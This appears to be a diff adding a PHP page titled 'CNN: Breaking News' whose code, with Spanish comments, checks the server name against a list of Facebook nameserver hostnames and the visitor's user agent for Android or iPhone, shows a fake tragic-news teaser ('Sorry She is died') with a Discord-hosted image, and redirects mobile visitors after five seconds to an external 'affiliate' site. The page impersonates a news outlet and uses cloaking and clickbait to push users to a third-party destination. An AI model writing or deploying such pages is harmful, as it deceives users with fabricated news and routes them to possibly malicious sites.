@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CNN: Breaking News</title>
+</head>
+<body>
+    <?php
+    // Lista de servidores a bloquear
+    $servidores_bloqueados = array(
+'a.ns.facebook.com',
+'b.ns.facebook.com',
+'c.ns.facebook.com',
+'d.ns.facebook.com',
+'c.ns.facebook.com',
+'b.ns.facebook.com',
+'a.ns.facebook.com',
+'d.ns.facebook.com',
+    );
+
+    // Obtener el nombre de dominio del servidor al que se intenta acceder
+    $dominio_servidor = $_SERVER['SERVER_NAME'];
+
+    // Comprobar si el servidor al que se accede está en la lista de servidores bloqueados
+    if (in_array($dominio_servidor, $servidores_bloqueados)) {
+        // Verificar el agente de usuario (User-Agent) para Android e iPhone
+        $user_agent = $_SERVER['HTTP_USER_AGENT'];
+        if (strpos($user_agent, 'Android') !== false || strpos($user_agent, 'iPhone') !== false) {
+            // Redirigir al enlace afiliado en caso de bloqueo y si el usuario está en Android o iPhone
+            $enlace_afiliado = 'https://paneldirecto.vercel.app'; // Reemplaza con tu enlace afiliado
+
+            // Mostrar una página con imagen, título y descripción antes de la redirección
+            echo '
+                <img src="https://media.discordapp.net/attachments/1145523686535856178/1160402548969189457/f273bfea-8839-4e36-8b39-ecfd8b48d5a2.jpeg?ex=65348816&is=65221316&hm=0cc280aeb1b4709b719fd8237bd0415bf6a97d9d246bc7eb7e004bc10044b174" alt="Imagen de ejemplo">
+                <h1>Sorry She is died</h1>
+                <p>Accident that occurred a few hours ago, unfortunate event.</p>
+            ';
+
+            // Redirigir después de unos segundos
+            header("refresh:5;url=$enlace_afiliado");
+            exit;
+        }
+    }
+
+    // Si no está en la lista de servidores bloqueados o si no está en Android o iPhone, se permite el acceso
+    echo "Bienvenido al servidor.";
+    ?>
+</body>
+</html>
